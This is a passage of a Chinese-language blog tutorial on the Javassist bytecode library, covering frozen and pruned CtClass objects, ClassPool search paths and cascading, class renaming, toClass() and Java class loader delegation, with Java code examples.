sayHello()&#123;\n"</span> +</span><br><span class="line">        <span class="string">"        System.out.println(\"Hello!\");\n"</span> +</span><br><span class="line">        <span class="string">"    &#125;"</span>,cc));</span><br><span class="line">System.out.println(cc.toClass().getMethods().length);  <span class="comment">// 10</span></span><br></pre></td></tr></table></figure><p><code>makeClass()</code>方法不能创建一个新的接口，需要使用<code>makeInterface()</code>方法才可以创建一个新的接口。 接口中的成员方法可以通过<code>CtMethod</code>的<code>abstractMethod</code>方法创建。</p><p>以上这个例子会报错：<code>com.sec.Point class is frozen</code></p><h3 id="Frozen冻结类"><a href="#Frozen冻结类" class="headerlink" title="Frozen冻结类"></a>Frozen冻结类</h3><blockquote><p> <strong>冻结类的含义</strong></p><p>如果一个<code>CtClass</code>对象通过<code>writeFile()</code>、<code>toBytecode</code>、<code>toClass()</code>方法被转换到class文件中，Javassist则会冻结这个<code>CtClass</code>对象。再对这个<code>CtClass</code>对象进行操作则是不允许的，当开发者尝试去修改一个已经被JVM加载过的class文件的时候会发出警告，因为JVM不允许重复加载一个class。</p></blockquote><p>一个冻结的<code>CtClass</code>可以通过其<code>defrost()</code>方法解冻，解冻后可以允许对这个CtClass修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 被冻结了，不能再修改(Exception in thread "main" java.lang.RuntimeException: com.sec.Point class is frozen)</span></span><br><span class="line"><span class="comment">// 解冻后可以修改</span></span><br><span class="line">cc.toBytecode();或者cc.toClass()<span class="comment">// 被冻结</span></span><br><span class="line">cc.defrost();<span class="comment">// 解冻</span></span><br><span class="line"><span class="comment">//以上两部顺序不能反，都是先解冻再修改。</span></span><br><span class="line">System.out.println(cc.getFields().length);</span><br><span class="line">cc.addField(CtField.make(<span class="string">"private String name;"</span>, cc));<span class="comment">// 解冻后允许修改</span></span><br><span class="line">cc.writeFile();</span><br><span class="line">System.out.println(cc.getFields().length);</span><br></pre></td></tr></table></figure><h3 id="修剪类-prune"><a href="#修剪类-prune" class="headerlink" title="修剪类 prune"></a>修剪类 prune</h3><p>如果ClassPool.doPruning被设置为true，那么当Javassist冻结一个CtClass对象时，Javassist就会对该对象中包含的数据结构进行修剪。为了减少内存消耗，修剪会丢弃该对象中不必要的属性（attribute_info结构）。例如，Code_attribute结构（方法体）会被丢弃。因此，当一个CtClass对象被修剪后，除了方法名、签名和注释外，无法访问方法的字节码。修剪后的CtClass对象不能再被解冻。ClassPool.doPruning 的默认值是 false。</p><p>要禁止修剪一个特定的CtClass，必须事先对该对象调用stopPruning(true)。</p><p>在调试时，你可能想暂时停止修剪和冻结，并将修改后的类文件写入磁盘驱动器。debugWriteFile()是一个方便的方法。它停止修剪，写入一个类文件，将其解冻，并再次开启修剪（如果最初是开启的）。</p><h3 id="类搜索路径"><a href="#类搜索路径" class="headerlink" title="类搜索路径"></a>类搜索路径</h3><p>默认的<code>ClassPool.getDefault()</code>检索路径和JVM底层路径一致（classpath）。<strong><em>如果一个程序运行在一个web应用程序比如JBoss、Tomcat中，<code>ClassPool</code>对象则可能搜索不到用户的类</em></strong>，因为这样的Web应用服务器使用多个类加载器以及系统类加载器。==在这种情况下，一个额外的classpath必须注册到<code>ClassPool</code>中==。假设pool引用了一个ClassPool对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加class查找路径search path</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(<span class="keyword">this</span>.getClass()));</span><br></pre></td></tr></table></figure><p>这个语句注册了用于加载这个对象类的类路径。你可以使用任何Class对象作为参数来代替this.getClass()。<code>Class</code>对象已经被注册上了的表现就是它所在的class path被加载了。</p><p>你也可以注册一个目录的名称作为一个class查找路径。例如，以下代码添加了<code>/usr/local/javalib</code>到class查找路径中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加文件目录作为class查找路径</span></span><br><span class="line">pool.insertClassPath(<span class="string">"/usr/local/javalib"</span>);</span><br></pre></td></tr></table></figure><p>还可以添加URL作为class查找路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加URL作为class查找路径，第三个参数必须/开头、第四个参数必须.结尾</span></span><br><span class="line"><span class="comment">// 添加 "http://www.javassist.org:80/java/"</span></span><br><span class="line">ClassPath cp = <span class="keyword">new</span> URLClassPath(<span class="string">"www.javassist.org"</span>, <span class="number">80</span>, <span class="string">"/java/"</span>, <span class="string">"org.javassist."</span>);</span><br><span class="line">pool.insertClassPath(cp);</span><br></pre></td></tr></table></figure><p>上面操作添加了<code>http://www.javassist.org:80/java/</code>到class查找路径中。这个URL仅仅用来查找<code>org.javassist.</code>包的类。</p><p>例如：加载一个<code>org.javassist.test.Main</code>类，它的class文件是： <code>http://www.javassist.org:80/java/org/javassist/test/Main.class</code> </p><p>此外，你还可以直接给一个byte数组去构建一个<code>CtClass</code>对象，可以使用<code>ByteArrayClassPath</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// byte数组形式class path</span></span><br><span class="line">ClassPool pool2 = ClassPool.getDefault();</span><br><span class="line"><span class="keyword">byte</span>[] arr = <span class="string">"org.byron4j"</span>.getBytes();</span><br><span class="line">String name = <span class="string">"org.byron4j.Hello"</span>;</span><br><span class="line">pool2.insertClassPath(<span class="keyword">new</span> ByteArrayClassPath(name, arr));</span><br><span class="line">CtClass ctClass = pool2.get(name);</span><br></pre></td></tr></table></figure><p><code>CtClass</code>对象ctClass表示字节数组b指定的class文件定义的类实例。<code>ClassPool</code>从给定的<code>ByteArrayClassPath</code>读取一个class文件。</p><p>如果调用get()并且给get()的类名等于name指定的类名，则ClassPool从给定的ByteArrayClassPath中读取类文件。</p><p>如果你不确定类的完全限定名，你可以使用<code>ClassPool</code>的<code>makeClass</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// makeClass</span></span><br><span class="line">ClassPool pool3 = ClassPool.getDefault();</span><br><span class="line">InputStream ins = <span class="keyword">new</span> FileInputStream(<span class="string">"/usr/local/javalib"</span>);</span><br><span class="line">CtClass ctClass1 = pool3.makeClass(ins);</span><br></pre></td></tr></table></figure><p>这里，makeClass() 返回从给定的输入流构建的 CtClass 对象。</p><p>你可以使用makeClass()将类文件急切地送入ClassPool对象。如果搜索路径包含一个大的jar文件，这可以提高性能。由于ClassPool对象按需读取类文件，它可能会重复搜索整个jar文件中的每一个类文件，makeClass()可以用来优化这种搜索。makeClass()构造的CtClass会被保存在ClassPool对象中，并且永远不会再读取类文件。</p><p>用户可以扩展class查找路径。可以定义一个实现<code>ClassPath</code>接口的新类，并将该类的一个实例交给ClassPool中的insertClassPath()。这种方式可以允许将非标准资源包含到class查找路径中。</p><h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>一个ClassPool对象是CtClass对象的容器。一旦一个CtClass对象被创建，它将永远记录在ClassPool中。这是因为编译器在以后编译引用该CtClass所代表的类的源代码时，可能需要访问该CtClass对象。</p><p>例如，假设一个新的方法getter()被添加到代表Point类的CtClass对象中。之后，程序试图编译包括Point中对getter()的方法调用的源代码，并将编译后的代码作为方法的主体，将其添加到另一个类Line中。如果丢失了代表Point的CtClass对象，编译器就无法编译对getter()的方法调用。请注意，原来的类定义并不包括getter()。因此，为了正确地编译这样的方法调用，ClassPool必须在程序执行的所有时间都包含CtClass的所有实例。</p><h3 id="避免内存不足"><a href="#避免内存不足" class="headerlink" title="避免内存不足"></a>避免内存不足</h3><p>如果CtClass对象的数量变得大得惊人，ClassPool的这种规范可能会造成巨大的内存消耗（这种情况很少发生，因为Javassist试图通过各种方式减少内存消耗：冻结calss等方式）。为了避免这个问题，你可以明确地从ClassPool中删除一个不必要的CtClass对象。如果你在一个CtClass对象上调用detach()，那么这个CtClass对象就会从ClassPool中删除。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = classPool.get(<span class="string">"org.byron4j.cookbook.javaagent.Javassist2ClassPool"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用该方法后，会将CtClass对象从ClassPool中移除</span></span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.detach();</span><br></pre></td></tr></table></figure><p>在detach()被调用后，你不能调用该CtClass对象上的任何方法。但是，你可以在ClassPool上调用get()来制作一个新的代表同一个类的CtClass实例。如果你调用get()，ClassPool会再次读取一个类文件，并新创建一个CtClass对象，这个对象由get()返回。</p><p>另一个想法是偶尔用新的ClassPool替换一个ClassPool，并丢弃旧的ClassPool。如果一个旧的ClassPool被垃圾回收，那么该ClassPool中包含的CtClass对象也会被垃圾回收。要创建一个新的ClassPool实例，请执行以下代码片段:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>)<span class="comment">//简单粗暴</span></span><br><span class="line"><span class="comment">// if needed, append an extra search path by appendClassPath()</span></span><br></pre></td></tr></table></figure><p>这将创建一个ClassPool对象，它的行为就像ClassPool.getDefault()返回的默认ClassPool一样，getDefault()只是一个方便的方法。</p><p>注意，new ClassPool(true)是一个方便的构造函数，它可以构造一个ClassPool对象，并将系统搜索路径附加到它上面。调用该构造函数相当于下面的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool();</span><br><span class="line">cp.appendSystemPath();  <span class="comment">// or append another path by appendClassPath()</span></span><br></pre></td></tr></table></figure><h3 id="级联ClassPool"><a href="#级联ClassPool" class="headerlink" title="级联ClassPool"></a>级联ClassPool</h3><p>如果程序运行在Web应用服务器上，是需要创建ClassPool的多个实例；应该为每个类加载器（容器）创建一个ClassPool的实例。==程序应该通过不调用getDefault()而调用ClassPool的构造函数来创建ClassPool对象==。</p><p>多个ClassPool对象可以像java.lang.ClassLoader一样级联。比如说 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 级联ClassPool</span></span><br><span class="line">ClassPool parent = ClassPool.getDefault();</span><br><span class="line">ClassPool child = <span class="keyword">new</span> ClassPool(parent);</span><br><span class="line">child.insertClassPath(<span class="string">"./classes"</span>);</span><br></pre></td></tr></table></figure><p>如果调用了child.get()，子ClassPool首先委托给父ClassPool。如果父ClassPool未能找到一个类文件，那么子ClassPool会尝试在./classes目录下找到一个类文件。</p><p>如果child.childFirstLookup为true，则子ClassPool在委托给父ClassPool之前，会尝试查找类文件。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// child classpool在委托之前加载类文件</span></span><br><span class="line">ClassPool parent2 = ClassPool.getDefault();</span><br><span class="line">ClassPool child2 = <span class="keyword">new</span> ClassPool(parent2);</span><br><span class="line">child2.appendSystemPath();         <span class="comment">// 和默认同样的class查找路径</span></span><br><span class="line">child2.childFirstLookup = <span class="keyword">true</span>;    <span class="comment">// 改变child的行为</span></span><br></pre></td></tr></table></figure><h3 id="改变类名来定义新类"><a href="#改变类名来定义新类" class="headerlink" title="改变类名来定义新类"></a>改变类名来定义新类</h3><p>一个新的class可以被定义为一个已存在的类的副本。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool3 = ClassPool.getDefault();</span><br><span class="line">CtClass cc3 = pool3.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc3.setName(<span class="string">"Pair"</span>);</span><br></pre></td></tr></table></figure><p>这个程序首先包含类Point的ctClass对象，然后调用<code>setName()</code>方法为CtClass对象设置新的名称。</p><p>在这个调用之后，该CtClass对象所代表的类定义中所有出现的类名都由Point改为Pair。类定义的其他部分不会改变。</p><p>注意，CtClass中的setName()会改变ClassPool对象中的一条记录。从实现的角度来看，ClassPool对象是一个CtClass对象的哈希表，setName()改变了哈希表中与CtClass对象相关联的key。该键由原来的类名改为新的类名。</p><p>因此，如果以后再次调用ClassPool对象的get(“Point”)，那么它再也不会返回变量cc3所指的CtClass对象。ClassPool对象又读取了一个类文件Point.class，它为类Point构造了一个新的CtClass对象。这是因为与名称Point相关联的CtClass对象已经不存在了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">CtClass cc1 = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc.setName(<span class="string">"Pair"</span>);</span><br><span class="line">CtClass cc2 = pool.get(<span class="string">"Pair"</span>);</span><br><span class="line">CtClass cc3 = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">System.out.println(cc == cc2);  <span class="comment">// true;</span></span><br><span class="line">System.out.println(cc3 == cc2); <span class="comment">// false;</span></span><br></pre></td></tr></table></figure><p>cc1和cc2指的是和cc一样的CtClass实例，而cc3没有。请注意，在执行cc.setName(“Pair”)后，cc和cc1引用的CtClass对象代表Pair类，所以cc2是去寻找Pair类而cc3还是去寻找Point类。</p><p><code>ClassPool</code> 对象用于维护类和CtClass的一对一映射关系。javassist不允许两个不一样的CtClass表示同一个class，除非是两个独立的ClassPool创建的。</p><p>为了创建一个默认ClassPool实例(Clas.getDefault()返回的)的一个副本，可以使用以下代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>这样一来，你拥有了两个ClassPool对象，可以从每一个ClassPool提供不同的CtClass对象表示同一个类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool10 = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass10 = pool10.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">ClassPool pool20 = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br><span class="line">CtClass ctClass20 = pool20.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">System.out.println(pool10 == pool20);   <span class="comment">// false 不同的ClassPool中表示同一个类的CtClass对象</span></span><br></pre></td></tr></table></figure><h3 id="通过重命名一个冻结的CtClass来创建一个新的CtClass对象"><a href="#通过重命名一个冻结的CtClass来创建一个新的CtClass对象" class="headerlink" title="通过重命名一个冻结的CtClass来创建一个新的CtClass对象"></a>通过重命名一个冻结的CtClass来创建一个新的CtClass对象</h3><p>一旦一个CtClass对象已经被writeFile()或者toBytecode()方法转到class文件，Javassist拒绝进一步修改该CtClass对象。因此，如果代表Point类的CtClass对象冻结后不能通过setName()修改它的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc.writeFile();<span class="comment">// 被冻结</span></span><br><span class="line">cc.setName(<span class="string">"Pair"</span>);<span class="comment">// 错误</span></span><br></pre></td></tr></table></figure><p>为了打破这个约束，可以使用ClassPool的<code>getAndRename()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool30 = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass30 = pool30.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">ctClass30.writeFile();<span class="comment">// 被冻结</span></span><br><span class="line"><span class="comment">//ctClass30.setName("Pair");// 冻结后不能使用--错误</span></span><br><span class="line">pool30.getAndRename(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>, <span class="string">"Pair"</span>);</span><br></pre></td></tr></table></figure><p>这是因为，如果调用getAndRename()，ClassPool首先读取Point.class来创建一个新的代表Point类的CtClass对象。然而，它在将该CtClass对象记录在哈希表中之前，会将该CtClass对象从Point重命名为Pair。因此，getAndRename()可以在调用代表Point类的CtClass对象的writeFile()或toBytecode()之后执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CtClass <span class="title">getAndRename</span><span class="params">(String orgName, String newName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取一个新的CtClass对象</span></span><br><span class="line">    CtClass clazz = get0(orgName, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(orgName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz <span class="keyword">instanceof</span> CtClassType)</span><br><span class="line">        ((CtClassType)clazz).setClassPool(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置新的名称</span></span><br><span class="line">    clazz.setName(newName);         <span class="comment">// indirectly calls</span></span><br><span class="line">                                    <span class="comment">// classNameChanged() in this class</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ClassLoader-类加载"><a href="#ClassLoader-类加载" class="headerlink" title="ClassLoader 类加载"></a>ClassLoader 类加载</h2><p>如果事先知道必须修改什么类，那么修改类的最简单方法如下。</p><ol><li>通过调用ClassPool.get()获得一个CtClass对象。</li><li>修改它</li><li>在该CtClass对象上调用writeFile()或toBytecode()来获取修改后的类文件。</li></ol><p>如果一个类是否被修改是在加载时确定的，用户必须使Javassist与一个类加载器协作。Javassist可以与类加载器配合使用，这样就可以在加载时修改字节码。Javassist的用户可以定义自己版本的类加载器，但也可以使用Javassist提供的类加载器。</p><h3 id="CtClass的toClass-方法"><a href="#CtClass的toClass-方法" class="headerlink" title="CtClass的toClass()方法"></a>CtClass的toClass()方法</h3><p>CtClass提供了一个方便的方法toClass()，它请求当前线程的上下文类加载器加载CtClass对象所代表的类。要调用这个方法，调用者必须有相应的权限，否则，可能会抛出一个SecurityException。</p><p>下面的程序显示了如何使用toClass()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool cp = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = cp.get(<span class="string">"Hello"</span>);</span><br><span class="line">        CtMethod m = cc.getDeclaredMethod(<span class="string">"say"</span>);</span><br><span class="line">        m.insertBefore(<span class="string">"&#123; System.out.println(\"Hello.say():\"); &#125;"</span>);</span><br><span class="line">        Class c = cc.toClass();</span><br><span class="line">        Hello h = (Hello)c.newInstance();</span><br><span class="line">        h.say();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.main()在Hello的say()的方法体中插入了对println()的调用。然后构造一个修改后的Hello类的实例，并在该实例上调用say()。</p><p>注意，==上面的程序取决于在调用toClass()之前，Hello类从未被加载==。如果不是这样，JVM就会在toClass()请求加载修改后的Hello类之前加载原来的Hello类。因此，加载修改后的Hello类会失败（会抛出LinkageError）。例如，如果Test中的main()是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Hello orig = <span class="keyword">new</span> Hello();</span><br><span class="line">    ClassPool cp = ClassPool.getDefault();</span><br><span class="line">    CtClass cc = cp.get(<span class="string">"Hello"</span>);</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么原来的Hello类在main的第一行就被加载了，而调用toClass()会抛出一个异常，因为==类加载器不能同时加载两个不同版本的Hello类==。</p><p><strong><em>如果程序运行在web容器中例如JBoss、Tomcat中，</em></strong> 上下文的类加载器使用<code>toClass()</code>方法可能并不适当。在这种情况下，你可能会看到一个不期望的异常<code>ClassCastException</code>。为了避免这种情况，你==必须明白清楚地给定一个适当的类加载器给<code>toClass</code>方法==。例如，如果<code>bean</code>是你的会话的bean对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ...</span><br><span class="line">Class c = cc.toClass(bean.getClass().getClassLoader());</span><br></pre></td></tr></table></figure><p>提供toClass()是为了方便。如果你需要更复杂的功能，你应该编写自己的类加载器。</p><h3 id="Java中的类加载"><a href="#Java中的类加载" class="headerlink" title="Java中的类加载"></a>Java中的类加载</h3><p>在Java中，多个类加载器可以共存，每个类加载器创建自己的命名空间。不同的类加载器可以加载具有相同类名的不同class文件，加载的两个类视为不同的类，这一个特性保证我们可以在一个JVM中运行多个应用程序即使这些程序包含相同类名的不同类实例。</p><p><strong>注意:</strong></p><p>==JVM不允许动态的重新加载一个类。一旦某个类加载器加载了某个类后，它就不能在运行时再重新加载一个新版本的类了。==</p><p>因此，你==不能在JVM加载类后，再去变更类的定义。==</p><p>但是，JPDA（Java平台调试架构）提供了有限的类重加载能力。</p><p>如果相同的class文件被不同的类加载器加载了，==JVM会使用相同的名称和定义创建两个不同的类==，这两个类会被看做是不同的。既然这两个类是不同的，所以一个类的实例就不能分配给另一个类类型的变量了。两个类之间的转码操作失败，并抛出一个ClassCastException。</p><p>例如，下面的代码片段就会抛出一个ClassCastException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MyClassLoader myLoader = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">Class clazz = myLoader.loadClass(<span class="string">"Box"</span>);</span><br><span class="line">Object obj = clazz.newInstance();</span><br><span class="line">Box b = (Box)obj;<span class="comment">// this always throws ClassCastException.</span></span><br></pre></td></tr></table></figure><p>Box类是由两个类加载器加载的。假设一个类加载器CL加载一个包括这个代码片段的类。由于这个代码片段引用了MyClassLoader、Class、Object和Box，CL也会加载这些类（除非它委托给另一个类加载器）。因此，变量b的类型就是CL加载的Box类。另一方面，myLoader也加载Box类。对象obj是myLoader加载的Box类的一个实例。因此，最后一条语句总是抛出一个ClassCastException，因为obj的类与作为变量b类型的Box类的不同版本。</p><p><strong>多个类加载器形成一个树结构</strong>:</p><p>每个类加载器（引导加载器BootstrapClassLoader除外）都有一个父的类加载器（通常是加载了该子类加载器的类）。类加载请求可以沿着这个类加载器层级委托，一个类可能会被不是你请求的类加载器去加载。因此，被请求去加载一个类C的类加载器和实际加载这个类C的加载器可能不是同一个类加载器。以示区别，我们将前面的加载器称为<strong><em>C的启动器</em></strong>，后面的称为<strong><em>C的真实加载器</em></strong>。</p><p>此外，如果请求加载类C的类加载器CL（C的发起者）委托给父类加载器PL，之后，类加载器CL则再也不会被请求去加载类C定义中引用的任何类。CL不是类C的引用的类的启动器，相反，PL成为了类C的引用的类的启动器，并且PL将会被请求去加载它们。<strong>类C的定义所引用的类是由C的真正的加载器加载</strong>。</p><p>再看一个有些细微差异的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;    <span class="comment">// 被PL加载</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Box</span> </span>&#123;      <span class="comment">// 引导器是CL，但是真实加载器是PL</span></span><br><span class="line">    <span class="keyword">private</span> Point upperLeft, size;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBaseX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> upperLeft.x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Window</span> </span>&#123;    <span class="comment">// 被CL加载</span></span><br><span class="line">    <span class="keyword">private</span> Box box;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBaseX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> box.getBaseX(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设一个类<code>Window</code>被一个类加载器CL加载了，则它的引导器和真实加载器都是CL。因为Window的定义引用了Box，所以JVM会请求CL加载Box。这里，假设CL将这个任务委托给父类加载器PL。加载Box的发起者是CL，但真正的加载器是PL。在这种情况下，Point的发起者不是CL，而是PL，因为它与Box的真正加载器相同。因此，CL永远不会被请求加载Point。</p><p>接下来，让我们考虑一个稍加修改的例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> 